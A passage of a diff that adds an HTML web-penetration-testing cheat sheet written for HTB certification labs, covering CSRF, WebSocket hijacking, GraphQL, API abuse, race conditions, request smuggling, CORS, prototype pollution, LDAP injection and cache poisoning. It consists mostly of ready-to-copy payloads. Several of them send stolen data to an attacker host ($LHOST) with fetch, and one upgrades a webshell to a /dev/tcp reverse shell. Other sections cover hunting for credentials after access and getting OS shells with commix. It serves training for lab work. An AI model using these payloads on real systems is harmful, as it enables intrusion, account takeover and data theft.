+        <span class="cm"># 4. Is unpredictable</span>
+
+        <span class="cm"># Test:</span>
+        <span class="cm"># 1. Copy legitimate request with CSRF token</span>
+        <span class="cm"># 2. Remove CSRF token → does request succeed?</span>
+        <span class="cm"># 3. Submit invalid CSRF token → does it fail?</span>
+        <span class="cm"># 4. Submit other user's CSRF token → does it fail?</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="csrf-poc">CSRF PoC</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">html</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">&lt;!-- GET-based CSRF --&gt;
+        &lt;img src="https://target.htb/account/delete?confirm=1"&gt;
+        &lt;script&gt;window.location='https://target.htb/account/promote?user=attacker&amp;role=admin'&lt;/script&gt;
+
+        &lt;!-- POST-based CSRF (auto-submit form) --&gt;
+        &lt;html&gt;
+        &lt;body onload="document.forms[0].submit()"&gt;
+        &lt;form method="POST" action="https://target.htb/account/change-email"&gt;
+        &lt;input type="hidden" name="email" value="attacker@attacker.com"&gt;
+        &lt;/form&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+
+        &lt;!-- JSON CSRF (if no Content-Type check) --&gt;
+        &lt;html&gt;
+        &lt;body onload="document.forms[0].submit()"&gt;
+        &lt;form method="POST" action="https://target.htb/api/update" enctype="text/plain"&gt;
+        &lt;input name='{"email":"attacker@attacker.com","ignore":"' value='"}'&gt;
+        &lt;/form&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+
+        &lt;!-- Fetch-based (same origin or CORS misconfigured) --&gt;
+        &lt;script&gt;
+        fetch('https://target.htb/api/update', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: 'attacker@attacker.com'})
+        });
+        &lt;/script&gt;</div>
+    </div>
+    <h3 class="md-h3" id="csrf-token-bypass">CSRF Token Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Remove token entirely</span>
+        <span class="cm"># Replace with empty string</span>
+        <span class="cm"># Use another user's valid token (if tokens not tied to session)</span>
+        <span class="cm"># Predict token (if it's timestamp-based or sequential)</span>
+        <span class="cm"># CSRF via XSS — extract token from page, include in request</span>
+        <span class="cm"># SameSite=None cookies without Secure flag — send cross-site</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a17-websockets-attacks" style="margin-top:36px"><span class="sec-title">A17 — WebSockets
+        Attacks</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Intercept in Burp: Proxy → WebSockets History</span>
+
+        <span class="cm"># Replay WebSocket messages in Burp Repeater</span>
+
+        <span class="cm"># Manipulation payloads in message body:</span>
+        {"action":"get_user","id":1} <span class="cm"># IDOR</span>
+        {"action":"get_user","id":1,"admin":true} <span class="cm"># privilege escalation</span>
+        {"message":"&lt;script&gt;alert(1)&lt;/script&gt;"} <span class="cm"># XSS via WebSocket</span>
+        {"query":"SELECT * FROM users"} <span class="cm"># SQLi via WebSocket</span>
+
+        <span class="cm"># CSWSH — Cross-Site WebSocket Hijacking</span>
+        <span class="cm"># If no CSRF token on WebSocket handshake AND cookies are not SameSite:</span>
+        &lt;script&gt;
+        var ws = new WebSocket('wss://target.htb/ws');
+        ws.onmessage = function(event) {
+        fetch('http://$LHOST/?data='+btoa(event.data));
+        };
+        ws.onopen = function() {
+        ws.send(JSON.stringify({"action":"get_profile"}));
+        };
+        &lt;/script&gt;
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a18-graphql-attacks" style="margin-top:36px"><span class="sec-title">A18 — GraphQL
+        Attacks</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detect GraphQL endpoint</span>
+        /graphql /api/graphql /v1/graphql /gql /query /api
+
+        <span class="cm"># Introspection — dump entire schema</span>
+        curl -X POST $URL/graphql -H "Content-Type: application/json" \
+        -d '{"query":"{__schema{types{name,fields{name,type{name,kind}}}}}"}'
+
+        <span class="cm"># Full introspection query</span>
+        curl -X POST $URL/graphql -H "Content-Type: application/json" -d '
+        {"query":"{ __schema { queryType { name } mutationType { name } types { ...FullType } directives { name
+        description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description
+        fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated
+        deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true)
+        { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on
+        __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType
+        { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } }
+        } } } }"}'
+
+        <span class="cm"># GraphQL voyager — visualize schema</span>
+        <span class="cm"># Paste introspection result at: https://ivangoncharov.github.io/graphql-voyager/</span>
+
+        <span class="cm"># Query examples</span>
+        <span class="cm"># Get all users</span>
+        curl -X POST $URL/graphql -H "Content-Type: application/json" -d '{"query":"{ users { id username email password
+        } }"}'
+
+        <span class="cm"># Mutation — change password</span>
+        curl -X POST $URL/graphql -H "Content-Type: application/json" -d '{"query":"mutation { updatePassword(userId: 1,
+        newPassword: \"hacked\") }"}'
+
+        <span class="cm"># GraphQL IDOR</span>
+        curl -X POST $URL/graphql -H "Content-Type: application/json" -d '{"query":"{ user(id: 1) { id username email }
+        }"}'
+
+        <span class="cm"># Batching attack (brute force OTP)</span>
+        [{"query":"mutation { verifyOTP(code: \"0000\") }"},{"query":"mutation { verifyOTP(code: \"0001\") }"},...]
+
+        <span class="cm"># SQLi in GraphQL arguments</span>
+        {"query":"{ users(filter: \"1' OR '1'='1\") { username password } }"}
+
+        <span class="cm"># Disable introspection bypass</span>
+        <span class="cm"># If introspection blocked, try:</span>
+        {"query":"{__schema{queryType{name}}}"} <span class="cm"># minimal introspection</span>
+        <span class="cm"># Or field suggestions (typo a field name, see suggestions in error)</span>
+
+        <span class="cm"># Tools</span>
+        python3 graphw00f.py -d -t $URL <span class="cm"># detect &amp; fingerprint</span>
+        clairvoyance -u $URL/graphql -o schema.json <span class="cm"># blind introspection</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a19-api-security-testing" style="margin-top:36px"><span class="sec-title">A19 — API
+        Security Testing</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Enumerate API versions</span>
+        /api/v1/ /api/v2/ /api/v3/ /api/beta/ /api/dev/
+
+        <span class="cm"># Common API endpoints</span>
+        /api/users /api/users/1 /api/profile /api/admin
+        /api/auth/login /api/auth/register /api/auth/token
+        /api/password/reset /api/keys /api/config
+
+        <span class="cm"># HTTP method testing on each endpoint</span>
+        curl -X GET $URL/api/users/1
+        curl -X POST $URL/api/users/1 -d '{}' -H "Content-Type: application/json"
+        curl -X PUT $URL/api/users/1 -d '{"role":"admin"}' -H "Content-Type: application/json"
+        curl -X DELETE $URL/api/users/1
+        curl -X PATCH $URL/api/users/1 -d '{"role":"admin"}' -H "Content-Type: application/json"
+
+        <span class="cm"># Mass assignment</span>
+        curl -X PUT $URL/api/users/profile \
+        -H "Content-Type: application/json" \
+        -d '{"username":"attacker","email":"x@x.com","isAdmin":true,"role":"admin","credits":9999}'
+
+        <span class="cm"># Excessive data exposure — check if response contains more than expected</span>
+        curl $URL/api/users/1 | python3 -m json.tool <span class="cm"># pretty print, look for hidden fields</span>
+
+        <span class="cm"># API key in headers</span>
+        X-API-Key: secretkey
+        Authorization: Bearer token
+        X-Auth-Token: token
+
+        <span class="cm"># Rate limiting bypass</span>
+        X-Forwarded-For: 127.0.0.1 <span class="cm"># spoof IP</span>
+        X-Real-IP: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        <span class="cm"># Change IP each request for brute force</span>
+
+        <span class="cm"># BOLA (Broken Object Level Authorization) = IDOR for APIs</span>
+        GET /api/invoices/1337 → try /api/invoices/1
+
+        <span class="cm"># BFLA (Broken Function Level Authorization)</span>
+        GET /api/users → 403
+        POST /api/admin/users → try without admin cookie
+        DELETE /api/users/1 → try as user
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a20-race-conditions" style="margin-top:36px"><span class="sec-title">A20 — Race
+        Conditions</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Scenarios:</span>
+        <span class="cm"># - Double spending (buy item twice with one payment)</span>
+        <span class="cm"># - Account balance manipulation</span>
+        <span class="cm"># - Coupon/discount code reuse</span>
+        <span class="cm"># - Password reset token reuse</span>
+        <span class="cm"># - Limited quantity bypass (only 1 left, buy 10)</span>
+
+        <span class="cm"># Turbo Intruder (Burp extension) — send requests simultaneously</span>
+        <span class="cm"># Script: send all at once using HTTP/2 single-packet attack</span>
+
+        <span class="cm"># Python threading approach</span>
+        python3 - &lt;&lt; 'EOF'
+        import requests, threading
+
+        def race_request():
+        r = requests.post('http://target.htb/redeem',
+        json={"coupon": "DISCOUNT50"},
+        cookies={"session": "your_session"})
+        print(r.status_code, r.text[:100])
+
+        threads = [threading.Thread(target=race_request) for _ in range(30)]
+        [t.start() for t in threads]
+        [t.join() for t in threads]
+        EOF
+
+        <span class="cm"># Ffuf parallel requests</span>
+        ffuf -u $URL/redeem -X POST -d 'coupon=SALE50' -H "Cookie: session=X" -w &lt;(python3 -c "print('x\n'*30)") -t
+        30
+
+        <span class="cm"># Race condition in file operations</span>
+        <span class="cm"># If app: check → use (TOCTOU)</span>
+        <span class="cm"># Create symlink between check and use:</span>
+        while true; do
+        ln -sf /etc/passwd /tmp/racefile
+        ln -sf /tmp/legit /tmp/racefile
+        done
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a21-http-request-smuggling" style="margin-top:36px"><span class="sec-title">A21 — HTTP
+        Request Smuggling</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Tools</span>
+        python3 smuggler.py -u $URL <span class="cm"># detect &amp; exploit</span>
+        <span class="cm"># Or use Burp Suite → HTTP Request Smuggler extension</span>
+
+        <span class="cm"># CL.TE (Content-Length frontend, Transfer-Encoding backend)</span>
+        POST / HTTP/1.1
+        Host: target.htb
+        Content-Length: 13
+        Transfer-Encoding: chunked
+
+        0
+
+        SMUGGLED
+
+        <span class="cm"># TE.CL (Transfer-Encoding frontend, Content-Length backend)</span>
+        POST / HTTP/1.1
+        Host: target.htb
+        Content-Length: 3
+        Transfer-Encoding: chunked
+
+        8
+        SMUGGLED
+        0
+
+
+        <span class="cm"># Bypass front-end access controls</span>
+        POST /admin HTTP/1.1 ← blocked
+        <span class="cm"># Smuggle admin request:</span>
+        POST / HTTP/1.1
+        Content-Length: 116
+        Transfer-Encoding: chunked
+
+        0
+
+        POST /admin/deleteUser HTTP/1.1
+        Host: localhost
+        Content-Length: 20
+
+        username=administrator
+
+        <span class="cm"># Capture other users' requests via request smuggling</span>
+        POST / HTTP/1.1
+        ...
+        0
+
+        GET / HTTP/1.1
+        X-Forwarded-For: 127.0.0.1
+        Host: target.htb
+        Cookie: session=
+        Content-Length: 900
+        Content-Type: application/x-www-form-urlencoded
+
+        <span class="cm"># Next victim's request gets appended here → you see their cookies</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a22-cors-misconfigurations" style="margin-top:36px"><span class="sec-title">A22 — CORS
+        Misconfigurations</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Test CORS</span>
+        curl -H "Origin: https://attacker.com" $URL/api/user -v | grep -i "access-control"
+
+        <span class="cm"># If response: Access-Control-Allow-Origin: https://attacker.com</span>
+        <span class="cm"># And: Access-Control-Allow-Credentials: true</span>
+        <span class="cm"># → Vulnerable!</span>
+
+        <span class="cm"># Checks:</span>
+        <span class="cm"># 1. Origin: https://attacker.com → reflected? → vulnerable</span>
+        <span class="cm"># 2. Origin: null → allowed? → exploit via sandboxed iframe</span>
+        <span class="cm"># 3. Origin: https://legitimate.target.com.attacker.com → allowed? → subdomain bypass</span>
+
+        <span class="cm"># Exploit — steal data from authenticated API</span>
+        &lt;script&gt;
+        fetch('https://target.htb/api/userdata', {credentials: 'include'})
+        .then(r =&gt; r.json())
+        .then(data =&gt; {
+        fetch('http://$LHOST/?data=' + btoa(JSON.stringify(data)));
+        });
+        &lt;/script&gt;
+
+        <span class="cm"># Host on your server, trick victim to visit</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a23-prototype-pollution" style="margin-top:36px"><span class="sec-title">A23 — Prototype
+        Pollution</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># JavaScript/Node.js vulnerability</span>
+        <span class="cm"># Pollute Object.prototype → affect all objects</span>
+
+        <span class="cm"># Detection</span>
+        <span class="cm"># In JSON params, try:</span>
+        {"__proto__":{"polluted":"yes"}}
+        {"constructor":{"prototype":{"polluted":"yes"}}}
+
+        <span class="cm"># URL params</span>
+        ?__proto__[polluted]=yes
+        ?constructor[prototype][polluted]=yes
+
+        <span class="cm"># Exploitation — RCE via server-side prototype pollution</span>
+        <span class="cm"># In express apps using lodash.merge/defaults:</span>
+        {"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=localhost:1337"}}
+
+        <span class="cm"># child_process.execSync / exec via prototype pollution</span>
+        {"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/cwd/shell.js"},"shell":"bash"}}
+
+        <span class="cm"># Tool: ppmap</span>
+        node ppmap.js --target $URL
+
+        <span class="cm"># Client-side → XSS</span>
+        <span class="cm"># Pollute innerHTML or similar sink property</span>
+        {"__proto__":{"innerHTML":"&lt;img src=x onerror=alert(1)&gt;"}}
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a24-ldap-injection" style="margin-top:36px"><span class="sec-title">A24 — LDAP
+        Injection</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># See also A04 section, fuller coverage here:</span>
+
+        <span class="cm"># Authentication bypass</span>
+        user=admin)(&amp;)&amp;pass=anything
+        user=*)(&amp;)&amp;pass=*)
+        user=*)(cn=*))(|(cn=*&amp;pass=x
+
+        <span class="cm"># Filter bypass payloads</span>
+        admin)(|(password=*)
+        *)(objectclass=*))(|(objectclass=*
+
+        <span class="cm"># Data enumeration (blind — response changes)</span>
+        <span class="cm"># Does user admin exist?</span>
+        user=admin)(uid=admin))%00&amp;pass=x
+        <span class="cm"># Does any user with password starting with 'a' exist?</span>
+        user=*)(userPassword=a*))(|(uid=*&amp;pass=x
+
+        <span class="cm"># Automated</span>
+        python3 ldap_injection.py -u $URL -p "user=INJECT&amp;pass=test" --true="Welcome" --false="Invalid"
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a25-web-cache-poisoning" style="margin-top:36px"><span class="sec-title">A25 — Web Cache
+        Poisoning</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Unkeyed headers — headers that affect response but not cache key</span>
+        X-Forwarded-Host: attacker.com
+        X-Forwarded-Scheme: https
+        X-Forwarded-Proto: https
+        X-Host: attacker.com
+        X-Forwarded-Server: attacker.com
+        X-Forwarded-For: 127.0.0.1
+
+        <span class="cm"># Test for cache poisoning</span>
+        <span class="cm"># 1. Send request with unkeyed header pointing to your server</span>
+        curl -H "X-Forwarded-Host: $LHOST" $URL/ -v
+        <span class="cm"># 2. Check if response reflects the header</span>
+        <span class="cm"># 3. If reflected AND response is cached → poison!</span>
+
+        <span class="cm"># Cache poisoning → XSS</span>
+        <span class="cm"># If app uses X-Forwarded-Host to build URLs in page:</span>
+        curl -H "X-Forwarded-Host: $LHOST/xss" $URL/
+        <span class="cm"># If response: &lt;script src="http://$LHOST/xss/app.js"&gt; → cache and serve malicious
+          JS</span>
+
+        <span class="cm"># Cache key bypass</span>
+        <span class="cm"># Add junk param that's stripped before cache: ?cb=1234</span>
+        <span class="cm"># Add null byte: ?%00=x</span>
+        <span class="cm"># Add param with different case</span>
+
+        <span class="cm"># Burp Param Miner → find unkeyed params</span>
+        <span class="cm"># Right-click request → Extensions → Param Miner → Guess params</span>
+
+        <span class="cm"># DoS via cache poisoning (poison error page)</span>
+        curl -H "X-Forwarded-Host: nonexistent" $URL/ <span class="cm"># triggers 500</span>
+        <span class="cm"># If cached → everyone sees error</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="post-exploitation-web-shell-pivot" style="margin-top:36px"><span
+        class="sec-title">Post-Exploitation — Web Shell & Pivot</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="web-shell-usage">Web Shell Usage</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Query your webshell</span>
+        curl "http://target.htb/shell.php?cmd=id"
+        curl "http://target.htb/shell.php?cmd=whoami"
+        curl "http://target.htb/shell.php?cmd=cat+/etc/passwd"
+
+        <span class="cm"># Upgrade to reverse shell from webshell</span>
+        curl "http://target.htb/shell.php?cmd=bash+-c+'bash+-i+&gt;%26+/dev/tcp/$LHOST/$LPORT+0&gt;%261'"
+        <span class="cm"># URL encoded:</span>
+        curl "http://target.htb/shell.php?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"bash -c
+        'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'\"))")"
+
+        <span class="cm"># POST-based webshell</span>
+        curl -X POST "http://target.htb/shell.php" -d "cmd=id"
+      </div>
+    </div>
+    <h3 class="md-h3" id="shell-stabilization">Shell Stabilization</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Python PTY</span>
+        python3 -c 'import pty; pty.spawn("/bin/bash")'
+        <span class="cm"># Ctrl+Z</span>
+        stty raw -echo; fg
+        export TERM=xterm
+        stty rows 40 cols 200
+      </div>
+    </div>
+    <h3 class="md-h3" id="source-code-review-after-access">Source Code Review After Access</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Find config/cred files</span>
+        find /var/www -name "*.php" -exec grep -l "password\|db_pass\|DB_PASSWORD" {} \;
+        find /var/www -name ".env" 2&gt;/dev/null
+        find /var/www -name "config.php" -o -name "settings.py" -o -name "database.yml" 2&gt;/dev/null
+
+        <span class="cm"># Database credentials → escalate</span>
+        mysql -u dbuser -p'dbpass' -e "SELECT user,password FROM mysql.user;"
+        mysql -u dbuser -p'dbpass' -D app -e "SELECT * FROM users;"
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="tools-quick-reference" style="margin-top:36px"><span class="sec-title">Tools Quick
+        Reference</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="scanning-enumeration">Scanning & Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Nikto</span>
+        nikto -h $URL -o nikto.txt
+        nikto -h $URL -ssl -port 443
+
+        <span class="cm"># WPScan (WordPress)</span>
+        wpscan --url $URL --enumerate vp,vt,u
+        wpscan --url $URL -e u --passwords /usr/share/wordlists/rockyou.txt
+
+        <span class="cm"># CMSeeK (multi-CMS)</span>
+        python3 cmseek.py -u $URL
+
+        <span class="cm"># Nuclei (template-based scanner)</span>
+        nuclei -u $URL
+        nuclei -u $URL -t cves/
+        nuclei -u $URL -t vulnerabilities/
+
+        <span class="cm"># SQLMap</span>
+        sqlmap -r request.txt --level=5 --risk=3 --dbs
+
+        <span class="cm"># DirSearch</span>
+        dirsearch -u $URL -e php,html,txt,bak -t 50
+
+        <span class="cm"># Gobuster</span>
+        gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html -t
+        50
+
+        <span class="cm"># ffuf</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 -mc
+        200,301,302,403
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation-tools">Exploitation Tools</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Burp Suite Pro (primary tool)</span>
+        <span class="cm"># sqlmap, tplmap, dalfox, xsstrike</span>
+        <span class="cm"># jwt_tool, phpggc, ysoserial, padbuster</span>
+        <span class="cm"># hydra, ffuf (brute force)</span>
+        <span class="cm"># Commix (command injection)</span>
+
+        <span class="cm"># Commix — automated command injection</span>
+        commix --url="$URL/page.php?arg=test"
+        commix --url="$URL/page.php" --data="arg=test"
+        commix --url="$URL/page.php?arg=test" --os-cmd="id"
+        commix --url="$URL/page.php?arg=test" --os-shell
+      </div>
+    </div>
+    <h3 class="md-h3" id="key-wordlists">Key Wordlists</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+        /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+        /usr/share/seclists/Discovery/Web-Content/common.txt
+        /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+        /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+        /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
+        /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+        /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+        /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt
+        /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+        /usr/share/wordlists/rockyou.txt</div>
+    </div>
+    <h3 class="md-h3" id="key-references">Key References</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">OWASP Top 10: https://owasp.org/Top10/
+        PortSwigger Web Labs: https://portswigger.net/web-security
+        HackTricks Web: https://book.hacktricks.xyz/pentesting-web
+        PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+        SecLists: https://github.com/danielmiessler/SecLists
+        XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+        SQL Injection Cheat: https://portswigger.net/web-security/sql-injection/cheat-sheet
+        SSTI Payloads:
+        https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+        Revshells Generator: https://www.revshells.com
+        GTFObins: https://gtfobins.github.io
+        LOLBAS: https://lolbas-project.github.io</div>
+    </div>
+    <hr class="md-hr">
+    <p class="md-p"><em>🔒 Built for HTB CWES/CWEE by J0stif | Web Penetration Testing Full Methodology</em> <em>Use
+        responsibly on authorized systems only.</em></p>
+
+  </div>
+  <script>
+    initPage({
+      title: 'Web Penetration Testing Cheatsheet',
+      breadcrumb: 'cheatsheets/htb_WEB_cheatsheet',
+      tags: [{ label: 'Web', color: 'orange' }, { label: 'OWASP Top 10', color: 'red' }],
+      extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">contents</div>
+        <a href="#by-j0stif-owasp-top-10-ctfhtb-cwescwee-full-coverage" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>by J0stif | OWASP Top 10 + CTF/HTB CWES/CWEE Full Coverage</a>
+<a href="#table-of-contents" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>📋 TABLE OF CONTENTS</a>
+<a href="#environment-setup-tools" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>🛠️ Environment Setup & Tools</a>
+<a href="#burp-suite-essentials" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Burp Suite Essentials</a>
+<a href="#phase-1-reconnaissance-mapping" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 1 — Reconnaissance & Mapping</a>
+<a href="#11-technology-fingerprinting" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.1 Technology Fingerprinting</a>
+<a href="#12-directory-file-fuzzing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.2 Directory & File Fuzzing</a>
+<a href="#13-subdomain-vhost-fuzzing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.3 Subdomain & Vhost Fuzzing</a>
+<a href="#14-parameter-discovery" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.4 Parameter Discovery</a>
+<a href="#15-source-code-review" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.5 Source Code Review</a>
+<a href="#phase-2-authentication-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 2 — Authentication Attacks</a>
+<a href="#21-brute-force-credential-stuffing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.1 Brute Force & Credential Stuffing</a>
+<a href="#22-password-reset-flaws" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.2 Password Reset Flaws</a>
+<a href="#23-mfa-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.3 MFA Bypass</a>
+<a href="#a01-broken-access-control" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A01 — Broken Access Control</a>
+<a href="#idor-insecure-direct-object-reference" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>IDOR (Insecure Direct Object Reference)</a>
+<a href="#privilege-escalation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Privilege Escalation</a>
+<a href="#jwt-role-tampering-see-also-a14" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>JWT Role Tampering (see also A14)</a>
+<a href="#a02-cryptographic-failures" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A02 — Cryptographic Failures</a>
+<a href="#sensitive-data-exposure" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Sensitive Data Exposure</a>
